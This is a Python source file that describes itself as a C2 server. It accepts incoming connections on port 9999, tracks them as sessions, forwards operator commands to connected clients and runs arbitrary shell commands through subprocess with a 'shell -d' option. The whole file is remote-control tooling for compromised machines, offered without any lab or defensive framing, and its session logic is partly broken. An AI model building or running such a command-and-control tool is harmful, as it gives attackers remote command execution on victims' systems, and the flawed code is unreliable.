import socket
import threading
import subprocess
import os
import sys

# Global variable to store active client sessions
active_sessions = {}

def handle_client(client_socket, client_address, session_id):
    """Handle interaction with a connected client."""
    print(f"[*] Session {session_id} started with {client_address}")
    client_socket.send(b"OK\n")

    while True:
        try:
            # Display prompt for the user
            client_socket.send(b"admin@medusax~$ ")

            # Receive command from the server
            command = client_socket.recv(1024).decode().strip()

            if command.lower() == "exit":
                print(f"[*] Closing connection with {client_address}")
                break

            elif command.lower() == "sessions":
                # List active sessions
                active_sessions_list = "\n".join([f"Session {id} - {address}" for id, address in active_sessions.items()])
                client_socket.send(f"Active sessions:\n{active_sessions_list}\n".encode())

            elif command.lower().startswith("sessions -i"):
                # Interact with a session
                session_id = int(command.split()[-1])
                if session_id in active_sessions:
                    client_socket.send(f"Interacting with session {session_id}\n".encode())
                    active_sessions[session_id].send(b"admin@medusax~$ ")

                    # Keep sending commands to the selected session
                    while True:
                        session_command = client_socket.recv(1024).decode().strip()
                        if session_command.lower() == "exit":
                            break
                        active_sessions[session_id].send(session_command.encode())
                        response = active_sessions[session_id].recv(4096).decode()
                        client_socket.send(response.encode())
                else:
                    client_socket.send(f"Session {session_id} not found.\n".encode())

            elif command.lower().startswith("sessions -k"):
                # Kill a specific session
                session_id = int(command.split()[-1])
                if session_id in active_sessions:
                    active_sessions[session_id].send(b"[*] Session terminated.\n")
                    active_sessions[session_id].close()
                    del active_sessions[session_id]
                    client_socket.send(f"Session {session_id} killed.\n".encode())
                else:
                    client_socket.send(f"Session {session_id} not found.\n".encode())

            elif command.lower() == "sessions -K":
                # Kill all active sessions
                for session in list(active_sessions):
                    active_sessions[session].send(b"[*] Session terminated.\n")
                    active_sessions[session].close()
                    del active_sessions[session]
                client_socket.send(b"All sessions killed.\n")

            elif command.lower().startswith("shell -d"):
                # Start a shell in the specified directory or default to C:\
                path = command.split()[-1] if len(command.split()) > 2 else "C:\\"
                if os.path.isdir(path):
                    os.chdir(path)
                    client_socket.send(f"Changed directory to {path}\n".encode())
                    while True:
                        client_socket.send(f"{os.getcwd()}$ ".encode())
                        shell_command = client_socket.recv(1024).decode().strip()
                        if shell_command.lower() == "exit":
                            break
                        result = subprocess.getoutput(shell_command)
                        client_socket.send(result.encode())
                else:
                    client_socket.send(b"Invalid directory.\n")

            elif command.lower() == "background":
                # Return to the main console without killing the session
                client_socket.send(b"Returning to the admin console...\n")
                break

            else:
                client_socket.send(b"Unknown command.\n")

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client_socket.close()
    del active_sessions[session_id]
    print(f"[*] Session {session_id} closed")

def start_server(host, port):
    """Start the C2 server and accept incoming connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Server started on {host}:{port}")

    session_id = 1
    while True:
        client_socket, client_address = server.accept()
        print(f"[*] Connection established with {client_address}")

        # Add the client to active sessions
        active_sessions[session_id] = client_socket
        session_thread = threading.Thread(target=handle_client, args=(client_socket, client_address, session_id))
        session_thread.start()

        session_id += 1

if __name__ == "__main__":
    HOST = "0.0.0.0"  # Listen on all available interfaces
    PORT = 9999
    start_server(HOST, PORT)
